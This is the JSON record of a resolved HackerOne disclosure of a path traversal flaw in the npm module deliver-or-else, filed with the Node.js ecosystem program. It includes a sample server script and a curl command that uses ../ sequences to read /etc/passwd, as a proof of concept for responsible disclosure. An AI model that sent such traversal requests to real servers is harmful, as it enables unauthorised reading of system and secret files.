{
  "id": 507310,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC81MDczMTA=",
  "url": "https://hackerone.com/reports/507310",
  "title": "[deliver-or-else] Path Traversal",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "high",
  "readable_substate": "Resolved",
  "created_at": "2019-03-10T04:49:02.886Z",
  "submitted_at": "2019-03-10T04:49:02.886Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "johnssimon007",
    "url": "/johnssimon007",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/NWPHHm8hwLotSetPuMmFkHCa/c8a1698ff707a5e3e8a91a3484838363845daac68cb82c86d55c9e2d44d67b67"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 23949,
    "url": "https://hackerone.com/nodejs-ecosystem",
    "handle": "nodejs-ecosystem",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
    },
    "permissions": [],
    "submission_state": "disabled",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "pentest_retesting_ends_at": null,
    "profile": {
      "name": "Node.js third-party modules",
      "twitter_handle": "",
      "website": "https://nodejs.org/en/security/",
      "about": "This program was used to handle vulnerabilities in the Node.js ecosystem."
    }
  },
  "has_bounty?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "submitted_with_assistant": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2020-01-29T16:26:38.200Z",
  "bug_reporter_agreed_on_going_public_at": null,
  "team_member_agreed_on_going_public_at": "2019-12-30T16:26:36.700Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "I would like to report path traversal in deliver-or-else module\nIt allows an attacker to read system files via path traversal through commandline\n\n# Module\n\n**module name:** deliver-or-else\n**version:** 1.0.0\n**npm page:** https://www.npmjs.com/package/deliver-or-else\n\n## Module Description\n\n> Copy description from npm page\n\n# Vulnerability\n\n## Vulnerability Description\n\nDirectory traversal through the url which doesn't verify the file is from the root directory path.\n\n## Steps To Reproduce:\n\n1.npm i deliver-or-else\n\n2.now create a node.js(test.js) file for starting up a localserver on port 80,which will serve the file on the directory(public) over the web browser depending on the file requested by user through url\n\nhere is code for test.js\n\nconst Deliver = require('deliver-or-else')\nconst path = require('path')\n \n// It is up to you to resolve the document root directory\nconst http = require('http')\nlet deliver = new Deliver(path.join(__dirname, 'public'))\nlet server = http.createServer((req, res) => {\n    /**\n     * The `deliver` method returns a `Promise`, which in turn can be used to \n     * catch any errors (such as a 404). We could also provide a `then` clause \n     * for when it works successfully and a file has been delivered.\n     */\n    deliver.deliver(req, res).catch((err) => {\n        // The err contains information regarding how the `fs.readFile` failed\n        \n        res.statusCode = 404\n        res.setHeader('Content-Type', 'text/plain')\n        res.end('404, no such file.')\n    })\n})\n \nserver.listen(80, '127.0.0.1', function () {\n    console.log('Starting server...')\n})\n\n3.run below command\nnode test.js\nthis will startup the server at port 80 \n\n4.trying to fetch a file outside of \"public\" dir is exempted and shows 404 error\n\n5.this can be bypassed by using curl via commandline by running below command\ncurl -v --path-as-is http://127.0.0.1:8080/node_modules/../../../../../etc/passwd\n\nwhich will return the passwd directory contents\n\n\n# Wrap up\n\n> Select Y or N for the following statements:\n\n- I contacted the maintainer to let them know: [N] \n- I opened an issue in the related repository: [N] \n\n> Hunter's comments and funny memes goes here\n\n## Impact\n\nThis vulnerability allows malicious user to read content of any file on the server, which leads to data breach or other attacks.",
  "weakness": {
    "id": 19,
    "name": "Path Traversal"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [
    {
      "id": 438490,
      "file_name": "Screenshot_from_2019-03-10_10-19-01.png",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/438/490/97a245cd45453e3d871c96ad73ab819249cd35ef/Screenshot_from_2019-03-10_10-19-01.png?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_from_2019-03-10_10-19-01.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_from_2019-03-10_10-19-01.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ6W3PGM7N%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T124208Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEIn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIEKISA6FQOdAnZWol4fT9bzQBETdFpveCd9R1UDfvbCrAiEA1NAyDc0xZXJ5CpzLoS9B1egL2gBBXXTT2Ba2CnT3FpMqsgUIEhADGgwwMTM2MTkyNzQ4NDkiDLP%2Fm3BikLjZp5N1nSqPBdm31YJhA9o6VV9N1v9fg3Z52LzkrWdTQ%2BZ2EZ%2FQUva8zBZCAFwcijCTVrauqFWFvciqOdKfkeoS5wkYqgASghj%2FdHl8SV8ZF3%2BrNwVSxNdRpKjJZvXGbE60PCS457xC6rX8jOfwwLLKI%2Frv6%2FsgTsxa5J1N3bR8%2BCjLIZIchld2gLH3N3ga1KiPIf7B618MFoxq5urS2pP9%2FlbfX5aHEq%2FSFKdVKgPZimfDVLuJF9EdO8x70yEe213pKFPvt28ajB0z7S9TPybFvK6u1H6c2Vz0qxp10JVq5XYtZanB9FOtL6rpB47JcMlmzvoPHGBPpBlKhNOjkUyC1ff08kvGv7R9HSbXP3YrSELPE1XQID%2BpH04DZeB5JGa2mFLZWS4Vu%2FtzLsURa8IpyL0N2Ukfi9ApoI6Qxar%2BxDr1Gp3FS9rHB7yna%2FTMcWrGY%2FD8Muc97ffKotXJ0Z%2BAoN9ylyxeoCImH7JSON4K2Du7F6DYDU8kJ95pRat4sbr3a5AQOc6yz6miC%2BAsGiOWUsUrUx1FE%2F6%2BhPaY7x%2FCDR9vKF0k%2FK0EVY0pX1SjE%2BE4ymu%2BRnXZACJWPU5oxUaylIr6T5dXA9255p9%2F4LQFDAe4bGo4BBIFdX2WuMWkMOGbb6hfJiRJJtvAKw9Ki4SV%2BYUdxSne0CGwChqPk6bBr7bRxGiFR2dXEl5OeXORhJzbCK93leYgVOFHe6d2HufojRzutB2iZLUIW8eBE9Y37GjexUl7L4NZ%2BDakGcGAWwTvyrxZdM9%2FT13Z11LDc%2BGUfJcCsRwTkkhxzFYP2DWiIdi8iW7yWuEQCehxafTosKX5u1n3%2F7ygrdXaeRM5MHlHvWs6Hdl71J2vqNmJq4EYZS%2FWbbVFCPcwve%2B%2BxgY6sQF0VVh%2FFtDkXoVs47o592VKuqUimL6pcCq9dFv84u6FYAn9YxGIKWgwCylRDmCvCfhTlRMJVvZ4fIVhEmHQVDKUsfn1nei6nPzgrX0Nkl6T%2BZgFDkmOX8p41ytRwhAQKv8kHpLCa7Qmz%2Bj6uAKF8mV44KR6qGPvVCslDB8KxNkEzYVOVcJyYn70ouj54GfMCHOhJavOrBEVeIHE0u2P8B7boiLZ6fYbvgCmNHLmSstRvBk%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=2667fd4d0f7d2cf32b718ee540ce0229fa8e316996311d68e333a859e686c635",
      "file_size": 99408,
      "type": "image/png",
      "moderated": null
    }
  ],
  "allow_singular_disclosure_at": "2020-01-29T16:26:36.790Z",
  "allow_singular_disclosure_after": -178143331.95222196,
  "singular_disclosure_allowed": true,
  "vote_count": 1,
  "voters": [
    "deb0con"
  ],
  "severity": {
    "rating": "high",
    "author_type": "User"
  },
  "structured_scope": null,
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
